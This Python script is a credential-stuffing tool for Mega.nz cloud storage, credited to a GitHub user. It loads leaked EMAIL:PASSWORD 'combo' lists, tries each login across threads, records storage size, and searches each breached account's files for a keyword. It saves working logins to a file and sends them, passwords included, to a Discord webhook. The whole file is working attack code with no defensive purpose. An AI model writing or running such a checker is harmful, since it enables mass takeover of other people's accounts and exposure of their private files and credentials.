from mega import Mega
from func import create_txt, fail, hit, logo, custom, error
from multiprocessing.pool import ThreadPool as Pool
import os
from discord_webhook import DiscordWebhook
from datetime import datetime

os.system("title Mega.nz Checker by Arboff")
logo()

global hits

create_txt()

print("\n=========================================================================================================================\n")

input("Place your combo inside combo.txt in format EMAIL:PASSWORD and press enter.")
with open("combo.txt", "r", encoding="utf-8") as g:
    lines = g.readlines()
    size = len(lines)
    g.close()
print(f"\n{size} lines detected.\n")
pool_size = 10
print("\n=========================================================================================================================\n")

try:
    pool_size = int(input("Enter how many threads you want to use. Default count is 10. More threads can lead to errors and skipping hits: "))
except Exception as e:
    print("\nInput not valid. Setting default count of threads to 10.")
    pool_size = 10



print(f"\nThread Count: [{pool_size}]")

print("\n=========================================================================================================================\n")

name = input("\nDefine filename: ")

filename = f"hits_{name}.txt"
print(f"\nHits will be saved to {filename}")

print("\n=========================================================================================================================\n")

search_string = input("\nDefine a word to look for inside the Account. Leave blank if you dont need word lookup: ")

if search_string == "":
    print("\nNo search String selected. Value will return FALSE\n")
else:
    print(f"\nKeyword selected: [ {search_string} ]. If found, value on hit will return TRUE.\n")

print("\n=========================================================================================================================\n")



webhook_Custom = input("If you want hits to be sent to your Discord, insert webhook and press enter. Otherwise, leave blank: ")

if webhook_Custom == "":
    print("\nNo Webhook Attached\n")
else:
    print("\nWebhook Attached. Hits will be sent to webhook aswell. You will get a test message right now.\n")
    webhook = DiscordWebhook(
        url=webhook_Custom,
        content=f"Webhook Successfully attached | Mega.nz checker by https://github.com/arboff | Combo Lines: {size} | Export name: {filename} | Keyword: {search_string} | Waiting for start.")
    response = webhook.execute()

print("\n=========================================================================================================================\n")

input("Press Enter to begin checking. Tool coded by https://github.com/Arboff.\n\n")




checked = 0
hits = 0
customs = 0
fails = 0



def check(username, password):
    global checked
    global hits
    global customs
    global fails
    tab_name = f"title Mega.nz Checker by Arboff // Checked: [{checked} / {size}] // Hit: [{hits}] // Custom: [{customs}] // Fail: [{fails} // Keyword: [ {search_string} ] // Export Name: [ {filename} ]"
    mega = Mega()
    os.system(tab_name)
    try:
        m = mega.login(username, password)
        space = m.get_storage_space(giga=True)
        used = space["used"]
        used = round(used,2)
        total = space["total"]
        files = str(m.get_files())
        found = False
        if str(search_string) in files and str(search_string) != "":
            found = True
        else:
            found = False
        hit_str = (f"{username}:{password} | Used Space: {used}GB | Total Space: {total}GB | Filename: {name} | Bots Count: {pool_size} | Combo Count: {size} | Local Time: {datetime.now()} | Keyword Match: {str(found).upper()} | Keyword: {search_string} | String Position in Array: [ {checked + 1} / {size} ]")
        print(f"{hit()} {username}:{password} | Used Space: {used}GB | Total Space: {total}GB | Keyword: {search_string} | Keyword Match: {str(found).upper()} | String Position: [ {checked + 1} / {size} ]")
        hits += 1
        try:
            webhook = DiscordWebhook(
                url=webhook_Custom,
                content=hit_str)
            response = webhook.execute()
        except:
            print(f"{error()} Webhook Error / Not Added.")

        with open(filename, "a") as e:
            e.writelines(f"{username}:{password} | Used Space: {used}GB | Total Space: {total}GB | Filename: {name} | Bots Count: {pool_size} | Combo Count: {size} | Local Time: {datetime.now()} | Keyword Match: {str(found).upper()} | Keyword: {search_string} | String Position in Array: [ {checked + 1} / {size} ]\n")
            e.close()

    except Exception as e:
        if "User blocked" in str(e):
            print(f"{custom()} {username}:{password} is blocked.")
            customs += 1
        else:
            print(f"{fail()} {username}:{password} is not valid.")
            fails += 1
    checked += 1
pool = Pool(pool_size)

with open("combo.txt", "r", encoding="utf-8") as f:
    lines = f.readlines()



for item in lines:
    try:
        username,password = item.split(":")
        password = password.strip()
        username = username.strip()
        pool.apply_async(check(username,password), (username,password))
    except Exception as e:
        1+1

pool.close()
pool.join()


webhook = DiscordWebhook(
        url=webhook_Custom,
        content=f"Checker Finished | Total Checked: {checked} | Combo Lines: {size} | Export name: {name} | Hits: {hits} | Custom: {customs} | Fails: {fails} | Keyword: [ {search_string} ]" )
response = webhook.execute()

input(f"\n\n\nChecker finished. Hits exported to {filename}. Webhook sent with results. Press enter to exit.")